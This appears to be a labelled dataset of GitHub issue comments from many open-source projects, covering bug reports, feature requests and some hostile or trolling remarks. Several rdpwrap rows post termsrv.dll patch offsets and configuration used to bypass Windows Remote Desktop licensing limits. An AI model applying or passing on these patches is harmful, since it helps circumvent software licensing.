core/owncloud/27775/298633953,core/owncloud/27775,"FYI, this is happening with the Debian repository too. ",False,True
HexEdit/strobejb/10/33865769,HexEdit/strobejb/10,"Hi James, This fix makes HexEdit to automatically pick up changes in the typelib files. Looks like this feature was implemented at some point but got broken later. This patch is cleaner than my previous pull request. It's in a feature branch, and it does not include any build compatibility changes. ",False,True
bootstrap/twbs/3057/5262215,bootstrap/twbs/3057,Someone with power (@friend ?) needs to set things in motion to make semicolons required in the spec. QED ,False,True
i2cdevlib/jrowberg/252/255254617,i2cdevlib/jrowberg/252,"@friend I don't think you are quite getting the point Jeff is making. The problem is not with his library, but with the Arduino Wire library itself that is part of the Arduino IDE. More specifically it is the two-wire interface (TWI) library that the Wire library calls to handle I2C communications. I stumbled upon this discussion looking for an alternative implementation of an I2C library for a unrelated device I am using and can confirm that any device that calls the Wire library will suffer the same issue you are talking about. While loops are used in the TWI library for communication, and as a result, the code can block all other functions on the Arduino while it is waiting infinitely in the TWI while loop. Jeff demonstrated the infinite loop by pulling out the SCL wire from his hardware. Internally, the TWI library provided by Arduino waits for a response from the sensor that is never coming because the physical wire is removed. While your friends at SEBRAE confirmed the behavior, like you they have wrongly assumed it is due to Jeff's code. If you took a different I2C sensor with a library written by a different person (such as the one for the sensor I am using) and pulled a wire, it would behave the exact same way. As for why can't Jeff put an interrupt in his code to check if the line is LOW for too long, the library is blocking anything from happening (Which is why everything stops). The Arduino environment is not a Real-Time Operating System (RTOS). The issue is outside Jeff's code. I hope this clarifies the issue. ",False,True
zfs/zfsonlinux/7401/379868980,zfs/zfsonlinux/7401,"I can reproduce it immediately by going with SAVEDIR_SORT_NONE. This explains why only old distros experience this. IIRC, tar is unsorted, so a  should be able to trigger this everywhere (untested). Obviously the hard-coded sequence from trisk's script also does it. ",False,True
ansible/ansible/13262/304351981,ansible/ansible/13262,I also need a way to have a loop over blocks. ,False,True
rails/rails/33677/415084810,rails/rails/33677,"40% of the world's rubies are known to be blood rubies. Therefore, I propose renaming Ruby to something else, because the word Ruby is offensive to me. ",False,True
TotalFreedomMod/TotalFreedom/2004/392536692,TotalFreedomMod/TotalFreedom/2004,"Cause im not  helping tf  From Ryan notifications@friend.com Sent Monday, May 28, 2018 35411 PM To TotalFreedom/TotalFreedomMod Cc marcocorriero; Mention Subject Re [TotalFreedom/TotalFreedomMod] Make execute a TFM command. (#2004) @friend What was the reason for the issue closing? — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread",False,True
ansible/ansible/13262/322008529,ansible/ansible/13262,"My use case a problematic task that fails due to network or some other known issue. With a block, I can use rescue to reset whatever network connection is problematic, but then there is no way to use retry (a do until loop) to retry the block after fixing the known issue in the rescue block. ",False,True
puppeteer-sharp/kblok/736/435962051,puppeteer-sharp/kblok/736,"Ok, thanks, now i have to make everything from the ground i think 👍 ",False,True
minecraft-bugs/tryashtar/864/339511941,minecraft-bugs/tryashtar/864,"&lt;img src="" width=20 height=20&gt; Starwarswii • Aug 8, 2014 Updating my drivers and/or the d snapshot seemed to fix it for me. ",False,True
bootstrap/twbs/9501/34855616,bootstrap/twbs/9501,"plus one bring it back, please ",False,True
termux-packages/termux/2735/412960091,termux-packages/termux/2735,"@friend  - By looking at this I'm very unsure that you properly test your scripts... Some posts above you wrote that this is not in case with . But bsdtar still produce the same behaviour as busybox's tar. I have finished... No more posts from me in this thread. I point you from where error comes - but you ignore, ok... ",False,True
ceph/ceph/12105/263411857,ceph/ceph/12105,"Also ran into this with civetweb when trying out multisite on master, will apply the patch and see if it works ",False,True
dovecot/mjhas/46/191753899,dovecot/mjhas/46,"I just installed postfix and dovecot via your modules. When processing mail i get the following message in mail.log ♠postfix/pipe[2689] 1BB6642432 to=philippdieter@friend.net, relay=dovecot, delay=626, delays=626/0.07/0/0.1, dsn=4.3.0, status=deferred (temporary failure. Command output doveconf Fatal Error in configuration file /etc/dovecot/conf.d/10- auth.conf line 122 Couldn't open include file /etc/dovecot/conf.d/auth-ldap.conf.ext Permission denied )` As there are no credentials or anything secret in this file I forked the module and changed the mode to 644. This is the mode all other files in conf.d have on debian. I'm asking because I want to be sure I don't overlook something. ",False,True
jobs/TechnologyMasters/144/415067969,jobs/TechnologyMasters/144,"This is not a job, this is a request for free work. should be closed. ",False,True
manageiq/ManageIQ/1210/102503009,manageiq/ManageIQ/1210,yeah I'm going to have to add local code to workaround this issue...maybe I can do something general in RelationshipMixin / Relationship ,False,True
Elgg/Elgg/12126/409995590,Elgg/Elgg/12126,I did try elgg-cli tools and got the same error. There's no error about upgrade.php not being accessible. The upgrade process seems to start at least until the fatal error occurs. I can't say at which point during the upgrade the error occurs though. I only see the result of the site no longer working once the error has occured. I'm using the rc1 zip from the community site for testing. I completely replaced the content of the install folder and have settings.php and .htaccess replaced+updated accordingly. ,False,True
bootstrap/twbs/3057/6762825,bootstrap/twbs/3057,It's important to remember that this struggle may lead to the end of all life as we know it. CHOOSE NOW WHERE YOU STAND. ,False,True
adaptive-images/CoolBreeze613/8/433378625,adaptive-images/CoolBreeze613/8,"CVE-2015-8857 - High Severity Vulnerability &lt;details&gt;&lt;summary&gt;&lt;img src=' width=19 height=20&gt; Vulnerable Library - &lt;b&gt;uglify-js-2.2.5.tgz&lt;/b&gt;&lt;/p&gt;&lt;/summary&gt; &lt;p&gt;JavaScript parser, mangler/compressor and beautifier toolkit&lt;/p&gt; &lt;p&gt;Library home page &lt;a href="" to dependency file /adaptive-images/package.json&lt;/p&gt; &lt;p&gt;Path to vulnerable library /tmp/git/adaptive-images/node_modules/transformers/node_modules/uglify-js/package.json&lt;/p&gt; &lt;p&gt;  Dependency Hierarchy   - grunt-html2js-0.2.9.tgz (Root Library)     - jade-1.11.0.tgz       - transformers-2.1.0.tgz         - x **uglify-js-2.2.5.tgz** (Vulnerable Library) &lt;/p&gt; &lt;/details&gt; &lt;p&gt;&lt;/p&gt; &lt;details&gt;&lt;summary&gt;&lt;img src=' width=19 height=20&gt; Vulnerability Details&lt;/summary&gt; &lt;p&gt;    The uglify-js package before 2.4.24 for Node.js does not properly account for non-boolean values when rewriting boolean expressions, which might allow attackers to bypass security mechanisms or possibly have unspecified other impact by leveraging improperly rewritten Javascript.  &lt;p&gt;Publish Date 2017-01-23 &lt;p&gt;URL &lt;a href= src=' width=19 height=20&gt; CVSS 3 Score Details (&lt;b&gt;9.8&lt;/b&gt;)&lt;/summary&gt; &lt;p&gt;  Base Score Metrics - Exploitability Metrics   - Attack Vector Network   - Attack Complexity Low   - Privileges Required None   - User Interaction None   - Scope Unchanged - Impact Metrics   - Confidentiality Impact High   - Integrity Impact High   - Availability Impact High &lt;/p&gt; For more information on CVSS3 Scores, click &lt;a href="" src=' width=19 height=20&gt; Suggested Fix&lt;/summary&gt; &lt;p&gt;  &lt;p&gt;Type Upgrade version&lt;/p&gt; &lt;p&gt;Origin &lt;a href="" Date 2018-12-15&lt;/p&gt; &lt;p&gt;Fix Resolution v2.4.24&lt;/p&gt;&lt;/p&gt; &lt;/details&gt; &lt;p&gt;&lt;/p&gt; Step up your Open Source Security Game with WhiteSource here  ",False,True
bootstrap/twbs/3057/5167308,bootstrap/twbs/3057,This is still going on?  We have to set up spam filters to dump this crap to the trash? KNOCK IT OFF. ,False,True
rdpwrap/stascorp/645/458334606,rdpwrap/stascorp/645,"i'm getting what @friend is getting, the listener isn't listening. Same result when i append to the ini file or downloading the ini file that @friend found. Tried restarting the termservice and reboot of the machine, nothing helps. Any ideas? I've verified that my dll file is on version 292 ",False,True
expo/expo/3030/451467374,expo/expo/3030,"@friend Yes, I'm fixing this issue right now. Sorry for the trouble 😞 The fix will be out soon. ",False,True
minitest/seattlerb/757/381788802,minitest/seattlerb/757,OK - it's leaving something not entirely useful to me ♠DEPRECATED Use assert_nil if expecting nil from /usr/local/bundle/gems/rspec-rails-3.7.2/lib/rspec/rails/adapters.rb212. This will fail in Minitest 6.` Maybe I need to update rspec-rails... minitest (5.11.3) rspec-rails (3.7.2)  ,False,True
AKS/Azure/287/433974590,AKS/Azure/287,node pools has been delayed by a quarter and will now come in the 1st quarter of 2019. Apologies for the delay. I will keep you posted if we get it in earlier. ,False,True
rails/rails/1917/1477622,rails/rails/1917,@friend the reason the exception is still there is so that you can override handle_unverified_request and raise it yourself. The reason that the code defaults to resetting the session is that the main class of requests affected by the change were API requests which generally weren't using sessions so it was better than starting to generate errors. Since it was a security flaw there was no choice other than to break backwards compatibility. ,False,True
coffeescript/jashkenas/4056/128055985,coffeescript/jashkenas/4056,"Ok, I see your point of view and I respect it. Thanks! ",False,True
serverless-stack-com/AnomalyInnovations/63/348713275,serverless-stack-com/AnomalyInnovations/63,"Hi all, everything was working fine until I run npm run build... I'm using babili instead of uglify... The build is complete, but when I run the project I get this error Uncaught (in promise) TypeError h.a.config.credentials.getPromise is not a function Does anybody have an idea of what's going wrong? Thanks in advance for helping. ",False,True
Kosmos/AtlasNX/187/465096481,Kosmos/AtlasNX/187,I think we came up with a solution I'm okay with. No options in Kosmos Updater. If the user has ES Patches already installed Kosmos Updater will continue to update ES Patches. If the user doesn't already have ES Patches then it won't install/update them. ,False,True
minecraft-bugs/tryashtar/864/339511908,minecraft-bugs/tryashtar/864,"&lt;img src="" width=20 height=20&gt; Tuukka Mannermaa • Oct 27, 2012 It seems like the mobs are affected by the new potion ''Invisibility potion''.. I have no idea. ",False,True
bootstrap/twbs/3057/5137403,bootstrap/twbs/3057,Don't use JSMin with this project. Write documentation for newbies explaining why they shouldn't use JSMin.  Don't tell the maintainer he has to do x or y for his own project.  Fork it if you feel strongly enough to change the code. @friend shouldn't change his code to work with JSMin and @friend shouldn't change his code so bootstrap can work with it.  Just document why it doesn't work and move on? ,False,True
hoverfly/SpectoLabs/821/473170840,hoverfly/SpectoLabs/821,"Please find below details of questions with highlighted answers 1. Is the real service a production service?    Ans -- Real service is not a     production service. 2. How long is capturing going to continue if the real service is responding fine?  Ans -  if real service is responding fine then on first     time hoverfly should capture the response in simulation file and after that     its gives real response till service is up. 3. Should Hoverfly discard data after a certain period of time?  Ans-- At     the first successful response of the day, it should capture the response     through hoverfly then Hoverfly should discard the previous recorded data. 4. Hoverfly should wait for the real service in capture mode. How long should it wait?   Ans -- Wait time should be configurable from our end as     different services have different wait time. 5. Does Hoverfly try again on the next request if there is no response if the last one timed out (note that in this circumstance Hoverfly will appear to be as slow as your timeout)?   Ans - if service is down then first     hoverfly should declare that this service is down and goes into simulation     mode 6. Instead of that, does Hoverfly declare the real service down and respond immediately?   Ans -- Hoverfly should declare the service down and     goes into simulation mode. 7. How does Hoverfly know that the real service has come back? Is Hoverfly continually trying the real service perhaps?   Ans -- Whenever we     execute the test cases, if service is up, request should go to main     application/service and hoverfly should also capture the response at that     time, and if service is down then hoverfly should go into simulation mode. Please help me this is very urgent for me. ",False,True
ansible/ansible/13262/322446300,ansible/ansible/13262,"How else do you want to show ansible developers that this feature is actually useful and would be good to implement it? You can always create a mail filter, can't you? ",False,True
core/owncloud/26374/253665345,core/owncloud/26374,"something I am not understanding also maybe related. My dates are wrong; in the activity tab it says for some tasks ""in 7 hours"" what does that mean ? is it doing a task that needs time ? ",False,True
AKS/Azure/287/412078807,AKS/Azure/287,Can we at least open up preview versions? 😭 ,False,True
rails/rails/33677/414873738,rails/rails/33677,"Regardless of origin, allow/deny are simply clearer terms that does not require tracing the history of black/white as representations of that meaning. We can simply use the meaning directly. ",False,True
LiipFunctionalTestBundle/liip/328/311665051,LiipFunctionalTestBundle/liip/328,"No @friend  Right now this is the only fixture I have in the project class LoadUserData extends AbstractFixture implements OrderedFixtureInterface {     public function load(ObjectManager $manager) void     {         $user = $this-&gt;createUser('joey');         $manager-&gt;persist($user);         $manager-&gt;flush();         $this-&gt;addReference('user', $user);     }      private function createUser(         string $username,         string $password = '$2y$13$JTAzYtc2aRE0Ma3gYpxmbeI6vuxy1uJcok1Dg/QKgaVwiqrrsngae'     //Password = 12345678     ) User {         return new User($username, $password);     }      public function getOrder() int     {         return 1;     } }  ",False,True
lxqt/lxqt/1628/441141840,lxqt/lxqt/1628,"After reading in lxqt/lxqt-session#126 again it might be that i was far to optimistic about distributions. But the original problem remains What if the chosen distribution preset was really well thought and we paint it over? (Don't know much about NixOS and such things, but ...) Just played a bit in Arch  to so maybe we should set '/usr/share/' here too - i'm not happy about, but - if so, we also should review #126 again. At least this would solve the Gentoo and the Lubuntu problems without the need for them to change anything. Second thought - if we activate this, whats about some cmake magic like -DXDG_FOO=""$BAR"" ",False,True
A3-Antistasi/A3Antistasi/57/394295262,A3-Antistasi/A3Antistasi/57,"Will try to persistent save YES by default and only being able to be changed by server admins, so new starts Will allways depend on an admin. Switch commander yes by default and membership yes by default, but those will get overriden once the load is done. ",False,True
flood/jfurrow/240/412904474,flood/jfurrow/240,@friend @friend Agreed. Does ruTorrent support multiple auth types? I've only used it with basic_auth. ,False,True
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/400725098,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183,"I too like having them side-by-side as I comment but I also just study the solution first. If I'm going to copy/paste one, I'd rather write the comments where I have spell checker.  It seems the old interface had auto-spell checking on and the new one doesn't.  I guess that is a separate issue. ",False,True
Ghost-CLI/TryGhost/678/374473925,Ghost-CLI/TryGhost/678,"FYI you're definitely breaking rule 3 of the CoC Because of other issues, when a sudo command is run, output is proxied through the CLI, so when the sudo password is requested, you don't get the usual command. There was intentional context () to suggest the CLI was asking for the sudo password. Your issue with installing knex-migrator isn't an issue with ghost, rather an issue with NPM and the way it handles installation (on what I'm presuming is node 8) ",False,True
minitest/seattlerb/779/430842876,minitest/seattlerb/779,In order to avoid the deprivation warnings I simply converted  my random data with nullables tests to . 🤷🏼‍♂️ ,False,True
Titan/Marc3842h/145/459801647,Titan/Marc3842h/145,can u please make a release fix? I tried to install from source but I cant open Titan PS installin everything and says 'titan is rdy to use' but it does not open ,False,True
sciencefair/codeforscience/50/289325339,sciencefair/codeforscience/50,It seems that windows apps cannot be signed with an Apple-issued certificate ( So we'll need to buy a separate cert for windows and configure appveyor for that cert. #sigh ,False,True
Elgg/Elgg/6779/41450145,Elgg/Elgg/6779,@friend agree... @friend No...i don't know about toggle ,False,True
i2cdevlib/jrowberg/252/369645857,i2cdevlib/jrowberg/252,"@friend I have to say, I highly dislike your attitude. To summarize, you have unoffcial hardware, you admitted having limited knowledge of the library you use and the I2C (TWI) protocol, you did not provide anything concerning your hardware setup and wiring and yet you insist in making claims about  i2cdevlib reliability even after numerous people, including mr. Rowberg himself, has pointed to you the potential source of your issue. Astro-Johnny scope out the faulty sequence and finaly proved that the MPU keep the data line latch low. He also demonstrated how you could unlatch the data pin by forcing clock signal.  This has nothing to do with i2cdevlib and rather is linked to flemsy hardware and TWI driver implementation. I make a living developping embedded software. This is a common issue I had with numerous sensor. The sensor get stuck in is state machine and does not complete the I2C transaction hence keeping the data line low. I have implemented multiple I2C driver for a variety of mcu and now I always implement a recovery sequence in which the mcu take control of the I2C line and bit bang is way out forcing either a stop condition or a software reset on the sensor (see any I2C protocol documentation for this). Now as mr. Rowberg told you, it would be difficult to stay compatible with arduino platforme using is own TWI driver, not impossible, but not in the scope of this library. So you are left with these two choices  Buy thrusted hardware. Fix the WIRE library.  Also I would like to remind you that this is free open-source software. No one owes you anything. If you are so certain of the bug source then fix it yourself! Best luck with that! Regards, Alex ",False,True
dev/nethesis/5435/407337935,dev/nethesis/5435,in   nethcti-server3-3.2.0-1.ns7.x86_64.rpm nethcti-server3-debuginfo-3.2.0-1.ns7.x86_64.rpm  ,False,True
bootstrap/twbs/3057/5135512,bootstrap/twbs/3057,That is insanely stupid code. I am not going to dumb down JSMin for this case. ,False,True
core/owncloud/8282/41431120,core/owncloud/8282,Forgiven - has been a long day here as well wink ,False,True
nokogiri/sparklemotion/1709/357632186,nokogiri/sparklemotion/1709,Windows 7 x64 same error msg. ,False,True
ansible/ansible/13262/177003315,ansible/ansible/13262,"plus one  But it should be able to manage tasks with ""with_items"" so ""item"" might not be the good keyword here (speaking of the first message). Looping over an include means you need a new file. Looping over a block is way more cool ! ",False,True
find-and-replace/atom/322/70872731,find-and-replace/atom/322,You could also do  while the cursor is in the find box (sorry about the wrong shortcut listed above). ,False,True
Elgg/Elgg/6779/41463600,Elgg/Elgg/6779,@friend  elgg toggle is not enough for fully responsive project. you have any idea? ,False,True
asynqp/benjamin-hodgson/15/101220832,asynqp/benjamin-hodgson/15,"I agree with what you say in point 1. Regarding point 2, a little extra architectural knowledge off the top of my head might help. Each channel (including the connection, which is defined by AMQP to be channel 0) is essentially an actor with an inbox of frames from the server. The channel autonomously pulls frames out of the inbox and processes them using the correct method in the . The  is basically the entry point for a channel to process a frame. The inbox is implemented as a  - there is one queue per open channel; these are managed by the . So when a frame arrives, the  tells the  to put the frame in the queue of the correct channel. The  is basically an implementation detail of the handler; it keeps track of which objects on a channel are waiting for which frames and notifies them when a frame arrives. It mediates between API classes such as  and the objects which respond to the server (the s). So given all that, I think that error handling should respect the current architecture and go via the  and the . I think the right way to go is to add a special type of message which shuts down the actor (this is usually called a ""poison pill"") and a corresponding method on the  to respond to it. I guess this method would tell its  to kill all of its currently-live . The downside of this approach is that the poison pill message has to wait in the inbox until everything before it in the queue has been processed, which could cause problems if those messages block or if  never gets called - though I don't think that'll be too much of an issue in practice. That sounds like quite a lot of work to me. If you want to submit a pull request for part 1 (raising exceptions from the  when the connection dies) and leave part 2 (the poison pill message) to me then I'm fine with that. But if you fancy a challenge then I'll be very happy to accept a contribution for each of them! ",False,True
bootstrap/twbs/8662/21670029,bootstrap/twbs/8662,"Yup! Yup! Yes it is! We're not exactly following Windows 8 or iOS 7—if you step back and think through what it means to be a bootstrapping framework, you'll understand why we've simplified things. Easier overrides and fewer lines of code are *huge8 advantages. This isn't about trends. I know, right!? Ugh. Cool—see you around then! &lt;3 ",False,True
bootstrap/twbs/3057/5137306,bootstrap/twbs/3057,Disagree with Mr. @friend approach you distribute the code to developers and don't want to listen to good practices that are advised. I would have refactored the code when I had faced complaints from the users. ,False,True
zfs/zfsonlinux/7401/379903582,zfs/zfsonlinux/7401,"Right I didn't mean to suggest this issue should be closed, and reverting the change was all that was needed.  There's still clearly careful investigation to be done, which we can now focus on. @friend when possible rolling back to a snapshot would be the cleanest way to recover these files.  However, since that won't always be an option let's investigate implementing a generic orhpan recovery mechanism.  Adding this functionality initially to  would allow us to check existing datasets, and would be nice additional test coverage for  to leverage.  We could potentially follow this up with support for a  directory. ",False,True
moose/idaholab/12263/427479711,moose/idaholab/12263,@friend is wrong ,False,True
Elgg/Elgg/6779/41424803,Elgg/Elgg/6779,"@friend could you please check the toggle elsewhere? Open close widgets,  Profile &gt; Owner menu &gt; Admin options ",False,True
bootstrap/twbs/24475/442818583,bootstrap/twbs/24475,... Or use named params ... or create your own  shortcode ... Main point being Don't underestimate the power and simplicity of shortcodes. ,False,True
jekyll/jekyll/6948/386793771,jekyll/jekyll/6948,@friend GitHub data should be part of GitHub-metadata plugin not Jekyll-core ,False,True
asmjit/asmjit/231/455814932,asmjit/asmjit/231,Maybe linking  would help others understand why I have refused your donations after 2016 and why I think this couldn't end up differently. ,False,True
moose/idaholab/12263/427487017,moose/idaholab/12263,It might help if I post an example input for the current work in progress version ,False,True
rdpwrap/stascorp/611/446559765,rdpwrap/stascorp/611,thank you very much hajubu it's working for me on build 17763.194 but i havent [10.0.17763.1] section i only have [10.0.17763.1-SLInit] section but its works! anyone need help just follow these steps from above from hajubu ,False,True
bootstrap/twbs/3057/5139976,bootstrap/twbs/3057,"@friend Even on fast connections, minifying is important. Of course, other things should also be done for maximum increase in speed - minify, concatenate, gzip. ",False,True
termux-packages/termux/2735/412869675,termux-packages/termux/2735,@friend  then uncomment  comment out  . Busybox tar does not complete untarring as expected; See referenced issues above. ,False,True
bootstrap/twbs/3057/5137670,bootstrap/twbs/3057,/ Title Immediate functions Description syntax that enables function execution as soon as it is defined/ (function () { console.log('watch out!'); }()); //alternative with less parentheses !function () { console.log('watch out!'); }(); // reference //  ,False,True
rails/rails/33677/414873068,rails/rails/33677,At least one source from a search suggests the word had its origins around union members. ,False,True
angular.js/angular/14436/210032472,angular.js/angular/14436,"True, totally agree I didn't provide a PR that doesn't change the fact the bug exist where it shouldn't as this issue was in development for a long time. ",False,True
bootstrap/twbs/7482/12846560,bootstrap/twbs/7482,The suggested usage of the  element within a  element in order to markup a subtext is incorrect usage of the  element. The HTML5 specification states that It then gives examples of small print A subtitle or subtext within a  element does not match the specification definition of small print and therefore the  should not be used in this manner. ,False,True
core/owncloud/27775/301574559,core/owncloud/27775,"Folks,  first of all.. 10.0 packages are still there, but not in the stable repository, this is because they were reverted, they won't be released to stable until next patch update. We cannot fix the fallout problems in your installation (or better said the weird apt behaviour ) magically from remote. We will try not to have to revert released packages again. Sorry for the inconvenience. ",False,True
Skript/SkriptLang/1568/425709661,Skript/SkriptLang/1568,"We do not officially support anything lower than 1.9, so you're on your own. ",False,True
rdpwrap/stascorp/645/400952716,rdpwrap/stascorp/645,I am currently able to login by using the same offsets as 288 from here  have only tested x64. ♠; ;----------------------snip part1 [10.0.17763.292] ; Patch CEnforcementCoreGetInstanceOfTSLicense LocalOnlyPatch.x86=1 LocalOnlyOffset.x86=AFAD4 LocalOnlyCode.x86=jmpshort LocalOnlyPatch.x64=1 LocalOnlyOffset.x64=77A11 LocalOnlyCode.x64=jmpshort ; Patch CSessionArbitrationHelperIsSingleSessionPerUserEnabled SingleUserPatch.x86=1 SingleUserOffset.x86=4D665 SingleUserCode.x86=nop SingleUserPatch.x64=1 SingleUserOffset.x64=1322C SingleUserCode.x64=Zero ; Patch CDefPolicyQuery DefPolicyPatch.x86=1 DefPolicyOffset.x86=4BE69 DefPolicyCode.x86=CDefPolicy_Query_eax_ecx DefPolicyPatch.x64=1 DefPolicyOffset.x64=17F45 DefPolicyCode.x64=CDefPolicy_Query_eax_rcx ; Hook CSLQueryInitialize SLInitHook.x86=1 SLInitOffset.x86=5B18A SLInitFunc.x86=New_CSLQuery_Initialize SLInitHook.x64=1 SLInitOffset.x64=1ABFC SLInitFunc.x64=New_CSLQuery_Initialize ;.------------------------------------ ; ; ;.--------------------------snip part2 [10.0.17763.292-SLInit] bInitialized.x86 =CD798 bServerSku.x86 =CD79C lMaxUserSessions.x86 =CD7A0 bAppServerAllowed.x86 =CD7A8 bRemoteConnAllowed.x86=CD7AC bMultimonAllowed.x86 =CD7B0 ulMaxDebugSessions.x86=CD7B4 bFUSEnabled.x86 =CD7B8 bInitialized.x64 =ECAB0 bServerSku.x64 =ECAB4 lMaxUserSessions.x64 =ECAB8 bAppServerAllowed.x64 =ECAC0 bRemoteConnAllowed.x64=ECAC4 bMultimonAllowed.x64 =ECAC8 ulMaxDebugSessions.x64=ECACC bFUSEnabled.x64 =ECAD0 ;.--------------------------- ;` ,False,True
SickChill/SickChill/5159/437433474,SickChill/SickChill/5159,"Yea, but we ain't talking about password support, but some sort of encryption, which they may not support at the moment. ) I appreciate the wizard comments ) but was thinking more of asking the question, if they will be accessing sickchill remotely over the internet and configure accordingly(if yes, enable TLS, if not, don't enable it). ",False,True
i2cdevlib/jrowberg/252/264159320,i2cdevlib/jrowberg/252,"Hi all, Well... I use Jeff's library together with the NRF24L01 Radio 2.4GHz transceiver library on an Arduino UNO. The idea is to read data from the MPU6050 and then transmit it for further processing by a nearby computer. My problem with that was that I would, like most of you, see the arduino freeze after some seconds. The chances of getting the problem was somehow correlated with the use of the serial print, but not just that in my case! I work on an university robotic lab, thus I have permission to use multiples arduino boards. One day, trying to debug the problem, I noticed that the code would run normally on some arduino board (not freeze) and not in others. I had those made in Italy and those made in China.. It turns out, only the Italian ones work.  If I upload the same code on the Chinese boards it doesn't work! So, I assume, there must be some hardware incompatibilities issues with the library. In summary, I removed all calls to serial print inside the arduino loop function and use only Italian made boards. In the receiver code (arduino connected to the computer), I use the jeff's library with ros, in order to read the transmitted data from the serial port. It works for me! The only thing now is that I want to receive data at 100Hz, now I receive at about 48Hz. Maybe, the @friend tip on playing with TWBR may also work. Let's see! ",False,True
rippled/ripple/2241/335250615,rippled/ripple/2241," is showing 8 transactions when I lookup my address, while my call ♠root@friend~# curl -X POST -d '{ ""method""  ""account_tx"", ""params""  [ { ""account""  ""rBe...C6G"",""ledger_index_min""  32570, ""ledger_index_max""  33374525 } ] } '  is showing only 4 transactions! ",False,True
core/owncloud/8282/41027447,core/owncloud/8282,"Except the problem is server-side, and the server-side OS is Linux. The archive that gets created is also a zero-byte archive. ",False,True
msgpack-python/msgpack/305/401705283,msgpack-python/msgpack/305,"Like JSON, it's not goal of msgpack. You can use strict_types option to distinguish tuple and list when packing, and pack them to custom ExtType.  Then you can unpack ExtType manually. I won't add any more features for Python-only usages. msgpack is cross-language, portable format. ",False,True
ansible/ansible/13262/270881585,ansible/ansible/13262,Adding support for until-loop to Blocks is something I could find very useful in some of my playbooks. ,False,True
certbot/certbot/5433/358394908,certbot/certbot/5433,@friend any ideas? ,False,True
zfs/zfsonlinux/7401/380151942,zfs/zfsonlinux/7401,"FYI - you probably all saw it already, but we released zfs-0.7.8 with the reverted patch last night. ",False,True
moose/idaholab/12791/404882134,moose/idaholab/12791,"Rationale There is no state in steady state problem, only initial guess, etc. Calling  is just wrong. Description Whatever thing preventing us from removing this call should be fixed. Impact More robust code. ",False,True
SickChill/SickChill/5159/442521190,SickChill/SickChill/5159,"Like ITJamie, i use nginx to proxy to sickchill. So  ""Automatically generate the self signed ssl cert and enable SSL if it is not enabled Add settings buttons to generate letsencrypt SSL certs when you have a domain Force login authentication"" is ok for me, since it's optionnal. I don't like to be forced to do something ;) ",False,True
forum/standardnotes/39/386043830,forum/standardnotes/39,I'd also love to see an extension that would allow for keyboard shortcuts. In addition to those mentioned above. I'd be happy to see  to set focus to search bar and highlight search term (if one has already been entered) to clear search bar  ,False,True
mame/mamedev/4789/479068785,mame/mamedev/4789,"I do not use Linux and am not inclined to fix this, particularly with your ever-abusive attitude towards people who actually contribute to this project. ",False,True
btrfs/maharmstone/88/378871665,btrfs/maharmstone/88,,False,True
asynqp/benjamin-hodgson/15/103820444,asynqp/benjamin-hodgson/15,"Meh, failed flake8, those pesky empty spaces on blank lines. I'll fix and submit new merge requests ",False,True
puppeteer-sharp/kblok/736/442022145,puppeteer-sharp/kblok/736,@friend @friend could you try v1.10? ,False,True
core/owncloud/27775/301262036,core/owncloud/27775,"This fixed the problem on my end too. Thank you! Il 13 Mag 2017 1718, ""Saphieron"" notifications@friend.com ha scritto ",False,True
SickChill/SickChill/5159/437542109,SickChill/SickChill/5159,"Those particular apps where just examples, I just wanted to make the point, that by implementing tls, you could break third-party apps/code/plugins (ie chrome). Don't get me wrong, I am all for security, but it has to be the (educated) end users choice, not forced upon them. my 2p ) ",False,True
zfs/zfsonlinux/7401/380065566,zfs/zfsonlinux/7401,"In #7411, the  test looks like it may be a more robust reproducer (especially for future bugs) because it naturally relies on the ordering of the ZAP hashes. Also, if there are other reproducers, it might be a good idea to centralize discussion of them in that PR so they can be easily included. ",False,True
bootstrap/twbs/3057/5167342,bootstrap/twbs/3057,@friend there's a notification toggle at the bottom of the page. ,False,True
hoodie-app-tracker/hoodiehq/113/261708376,hoodie-app-tracker/hoodiehq/113,"Wow, I'm sorry it took this long to get to. Tested locally, it works! Merging. ",False,True
DietPi/Fourdee/1912/403347436,DietPi/Fourdee/1912,Which contains ,False,True
code-d/Pure-D/29/183002952,code-d/Pure-D/29,"ok i used workspace-d-installer to create all current binaries and now the log shows more traffic but still no completion -.- &lt;img width=""941"" alt=""screen shot 2016-02-11 at 19 36 10"" src=""",False,True
jekyll/jekyll/6948/415073688,jekyll/jekyll/6948,"In Reply to  I am aware of that solution, but it only causes new problems. The Szenario is I have a config-files with 100 lines of config. One, maybe two line of this config needs to be changed for different environments. With your solution, I need to duplicate 99 lines in three files (dev, staging, production) and manually sync them every time I make a change. This is bound to fail! People will forget to sync the changes and the main idea of a staging system (to behave like the production system) will be lost. Other solutions would be a. The one I describe in  Allowing more than one config, one general-config-file for all env, and one config-file for each env. This is similar to the way rails does it. The env-config will overwrite the general-config in case that is needed. c. Your solution, but with the ability to ""include"" or ""reference"" other config files inside the one I call with the jekyll build command. For this I would say ""build with staging-config"" and inside staging config ""use this 1 line and include/use all other lines from this other config-file"". d. …? ",False,True
bootstrap/twbs/3057/4106844,bootstrap/twbs/3057,bootstrap-dropdown.js when minified with JSMinminify produces error in Firefox error console  saying       clearMenus()needs ; on line   clearMenus()   !isActive &amp;&amp; $parent.toggleClass('open')  if in source  code this is corrected -- no error in minified version ,False,True
ansible/ansible/13262/322488616,ansible/ansible/13262,"@friend I understand, and that makes complete sense if the fix is to come from the community, but RedHat still has developers on staff for Ansible, and in that context there is power to prioritize things beyond what individual developers want to do if desired. Also if the owners want to prioritize this without taking it on internally, a bounty could be put on the issue which might increase the likelihood of someone taking it on personally. I'm not trying to imply that anything like this must be done, just raising it as a possibility since it's such a popular issue. ",False,True
rdpwrap/stascorp/611/447650212,rdpwrap/stascorp/611,1809-17763.1 -.55  -.107  -.134 has Always had the termsrv.dll.001 version Termsrv.dll with Version  -.165 -.167  -.168 (CU_KB4469342_v5.10)  have different CRC  but same Offset Values – see my template.zip in ^# 611. Therefore Data Sections 10.10.17763  for .1 and  .168  ought to be sufficient in most cases. Cu 4471332 does not touch termsrv.dll.168  only  in cases  less then  .168 ! OK? ^# 606 611 refer to These Facts !  and a little bit also in ^# 601 ( .165) 10.0.17763.194 - CU KB4471332 - keeps/lifts the termsrv.dll to its file version 10.0.17763.168. So this is a duplicate of #606 too. ,False,True
